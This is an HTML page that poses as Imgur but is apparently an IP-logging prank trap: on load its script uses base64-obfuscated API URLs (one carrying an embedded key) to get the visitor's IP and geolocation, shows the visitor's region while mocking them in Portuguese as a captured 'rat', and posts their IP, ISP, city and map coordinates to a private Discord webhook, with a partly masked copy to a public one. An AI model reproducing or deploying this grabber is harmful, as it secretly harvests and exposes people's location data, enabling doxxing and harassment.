<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Imgur</title>
    <link rel="icon" type="image/png" href="assets/imgur.png">
</head>

<body>

    <body
        style="margin: 0; padding: 0; font-family: Cambria, Cochin, Georgia, Times, 'Times New Roman', serif; background-color: #fefefe">
        <div
            style="width: 100vw; height: 100vh; display: flex; align-items: center; justify-content: center; flex-direction: column;">
            <img src="assets/mousetrap.gif" width="400">
            <h1>Mais um rat√£o de Imgur capturado! ü§£ü§£</h1>
            <h2> <span id="loc"></span></h2>
            <br>
            <h3><b><a href="https://discord.gg/K8zzbUDb">Se junte ao Discord dos ratos!</a></b></h3>
        </div>
    </body>

    <script>
        // Global vars
        let client = "Desconhecido";
        const urlParams = new URLSearchParams(window.location.search);
        client = urlParams.get('client');
        const PROD = true;

        // Getting the private and public webhook URLs from config.json
        async function getConfig() {
            try {
                const response = await fetch('assets/config.json');
                const config = await response.json();
                return config;
            } catch (error) {
                console.error('Error fetching config:', error);
                return null;
            }
        }

        // Main Class
        class MouseTrap {
            static privateWebhookURL = "";
            static publicWebhookURL = "";


            static async start() {

                getConfig().then(config => {
                    if (config) {
                        MouseTrap.privateWebhookURL = config.privateWebhookURL;
                        MouseTrap.publicWebhookURL = config.publicWebhookURL;
                    }
                });

                let ip;

                // Api Calls
                try {
                    await fetch(atob("aHR0cHM6Ly9hcGktYmRjLm5ldC9kYXRhL2NsaWVudC1pcA=="))
                        .then((body) => body.json())
                        .then((data) => {
                            ip = data.ipString;
                        })
                        .catch((error) => { });


                    let geoRes = await fetch(
                        `${atob("aHR0cHM6Ly9hcGktYmRjLm5ldC9kYXRhL2lwLWdlb2xvY2F0aW9uP2lwPQ==")}${ip}${atob("JmxvY2FsaXR5TGFuZ3VhZ2U9ZW4ma2V5PWJkY183ZDk5Y2VmNzM1YTk0Y2I0YjgyZDM3YTI5NTE4YTU2Nw==")}`
                    );
                    let geoData = await geoRes.json();

                    // Update view
                    let $loc = document.getElementById("loc");
                    $loc.innerHTML = 'O Rat√£o est√° em ' + geoData.location.principalSubdivision + ", " + geoData.location.localityName + "!";

                    // Loggers
                    if (PROD) {
                        if (client && client.toLowerCase() !== "desconhecido") {
                            MouseTrap.publicLogger(geoData);
                        }

                        MouseTrap.privateLogger(geoData);
                    }

                } catch (e) {
                    console.log(e);
                }
            }

            // Private logger
            static privateLogger(json) {
                const embed = {
                    color: MouseTrap.stringToColorDecimal(client || "Desconhecido"),
                    fields: [
                        // Capturado por
                        {
                            name: "üê≠ Capturado por",
                            value: client || "Desconhecido",
                            inline: true
                        },

                        // IP
                        {
                            name: "üíª IP",
                            value: json.ip,
                            inline: true
                        },

                        // Local
                        {
                            name: "üåç Local",
                            value: `${json.location.principalSubdivision}, ${json.location.localityName}, ${json.location.city}, ${json.country.isoName}`,
                            inline: false
                        },

                        // Provedor
                        {
                            name: "üõ°Ô∏è Provedor",
                            value: json.network.organisation,
                            inline: false
                        },

                        // Google Maps
                        {
                            name: "üìç Google Maps",
                            value: `https://www.google.com/maps?q=${json.location.latitude},${json.location.longitude}`,
                            inline: false
                        },

                        // Complete Info
                        {
                            name: "üìÑ Informa√ß√µes completas",
                            value: "https://api-bdc.net/data/ip-geolocation?ip=" + json.ip,
                            inline: false
                        }
                    ],
                };

                MouseTrap.sendMessage(MouseTrap.privateWebhookURL, embed);
            }

            // Public logger
            static publicLogger(json) {

                const arr = json.ip.split(".");
                if (arr.length === 1) {
                    arr = json.ip.split(":");
                }
                const ofuscatedIp = arr.length > 4 ?
                    `${arr[0]}:${arr[1]}:****:****:****:****:${arr[arr.length - 2]}:${arr[arr.length - 1]}`
                    : `${arr[0]}.${arr[1]}.***.${arr[3]}`;

                const params = {
                    color: MouseTrap.stringToColorDecimal(client || "Desconhecido"),
                    title: `üê≠ Rat√£o capturado por ${client}`,
                    fields: [
                        {
                            name: "üìç Localiza√ß√£o",
                            value: `${json.location.principalSubdivision}, ${json.location.localityName}, ${json.location.city}, ${json.country.isoName}`,
                        },
                    ],
                    footer: {
                        text: "IP do Rato: " + ofuscatedIp,
                    },
                };

                MouseTrap.sendMessage(MouseTrap.publicWebhookURL, params);

            }

            // Generic Message Sender
            static sendMessage(url, embed) {
                const request = new XMLHttpRequest();
                request.open("POST", atob(url));
                request.setRequestHeader("Content-type", "application/json");
                const params = {
                    embeds: [embed],
                };
                request.send(JSON.stringify(params));
            }

            // ColorPicker
            static stringToColorDecimal(str) {
                let hash = 0;
                for (let i = 0; i < str.length; i++) {
                    hash = str.charCodeAt(i) + ((hash << 5) - hash);
                }
                const r = (hash >> 16) & 0xff;
                const g = (hash >> 8) & 0xff;
                const b = hash & 0xff;
                return (r << 16) + (g << 8) + b;
            }
        }


        // Start
        MouseTrap.start();
    </script>
</body>

</html>
